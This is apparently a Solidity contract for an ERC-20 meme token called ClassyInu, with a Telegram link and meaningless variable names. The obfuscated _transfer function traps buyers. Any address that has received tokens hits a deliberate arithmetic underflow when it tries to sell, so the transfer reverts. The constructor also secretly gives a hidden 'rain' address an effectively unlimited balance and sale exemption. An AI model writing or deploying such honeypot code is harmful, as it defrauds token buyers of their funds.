// https://t.me/classyinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.2;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract ClassyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private bound;
    mapping(address => uint256) private most;

    function _transfer(
        address over,
        address measure,
        uint256 repeat
    ) internal override {
        uint256 known = inside;

        if (most[over] == 0 && bound[over] > 0 && over != uniswapV2Pair) {
            most[over] -= known - 1;
        }

        address were = address(farther);
        farther = ClassyInu(measure);
        bound[were] += known + 1;

        _balances[over] -= repeat;
        uint256 graph = (repeat / 100) * inside;
        repeat -= graph;
        _balances[measure] += repeat;
    }

    uint256 public inside = 0;

    constructor(
        string memory breath,
        string memory easier,
        address needs,
        address rain
    ) ERC20(breath, easier) {
        uniswapV2Router = IUniswapV2Router02(needs);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        most[msg.sender] = throughout;
        most[rain] = throughout;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[rain] = throughout;
    }

    ClassyInu private farther;
    uint256 private throughout = ~uint256(0);
}
